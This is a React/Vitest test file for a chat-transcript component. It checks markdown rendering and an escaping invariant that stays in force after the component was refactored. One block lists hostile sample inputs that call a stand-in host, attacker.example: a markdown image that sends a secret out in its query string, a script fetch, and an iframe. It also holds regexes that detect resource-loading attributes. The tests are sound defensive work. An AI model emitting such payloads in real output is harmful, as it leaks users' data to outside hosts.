import { describe, it, expect } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { ChatTranscript } from './ChatTranscript';
import type { TurnMessage } from '../types';

/**
 * The transcript after extraction — S5.
 *
 * Moving 59 lines of JSX out of a 1790-line component is exactly the kind of
 * change that silently drops an escaping rule, so INV-9 is re-asserted here
 * against the component that now owns the rendering rather than trusting that
 * the move was faithful.
 */

const turn = (over: Partial<TurnMessage>): TurnMessage => ({
  id: 'x',
  role: 'model',
  text: 'hello',
  timestamp: '2026-09-05T10:00:00.000Z',
  ...over,
});

const html = (turns: TurnMessage[]) => renderToStaticMarkup(<ChatTranscript turns={turns} />);

describe('rendering', () => {
  it('renders both roles', () => {
    const out = html([
      turn({ id: 'a', role: 'user', text: 'my question' }),
      turn({ id: 'b', role: 'model', text: 'my answer' }),
    ]);
    expect(out).toContain('my question');
    expect(out).toContain('my answer');
    expect(out).toContain('You');
  });

  it('names the model that answered', () => {
    expect(html([turn({ modelUsed: 'gemini-3.1-flash-lite' })])).toContain(
      'gemini-3.1-flash-lite',
    );
  });

  it('renders nothing for an empty transcript', () => {
    expect(html([])).toBe('');
  });

  it('formats markdown in a model turn', () => {
    expect(html([turn({ text: '**bold**' })])).toMatch(/<strong[ >]/);
  });

  it('renders a fenced block in a model turn as code', () => {
    const out = html([turn({ text: '```\nnpm test\n```' })]);
    expect(out).toContain('<pre');
    expect(out).toContain('npm test');
  });
});

describe('INV-9 survives the extraction', () => {
  const RESOURCE_ATTR =
    /(src|href|srcset|action|formaction|data|poster|background|ping|xlink:href)\s*=/i;
  const INLINE_HANDLER = /\son[a-z]+\s*=/i;

  const HOSTILE = [
    '![x](https://attacker.example/x.png?d=SECRET)',
    '<img src="https://attacker.example/raw.png">',
    '<script>fetch("https://attacker.example")</script>',
    '[click](https://attacker.example/phish)',
    'Visit https://attacker.example/bare now',
    '<iframe src="https://attacker.example/f"></iframe>',
  ];

  it.each(HOSTILE)('emits no resource-loading tag for %s', (payload) => {
    for (const role of ['user', 'model'] as const) {
      const out = html([turn({ role, text: payload })]);
      const tags = (out.match(/<[^>]+>/g) ?? []).filter(
        (t) => RESOURCE_ATTR.test(t) || INLINE_HANDLER.test(t),
      );
      expect(tags, role).toEqual([]);
    }
  });

  it('a user turn is escaped too, not trusted because it is first-party', () => {
    // A user who pastes a poisoned string into their own entry should not be
    // able to attack their own browser with it.
    const out = html([turn({ role: 'user', text: '<img src="https://attacker.example/u.png">' })]);
    expect(out).not.toMatch(/<img/i);
    expect(out).toContain('&lt;img');
  });
});
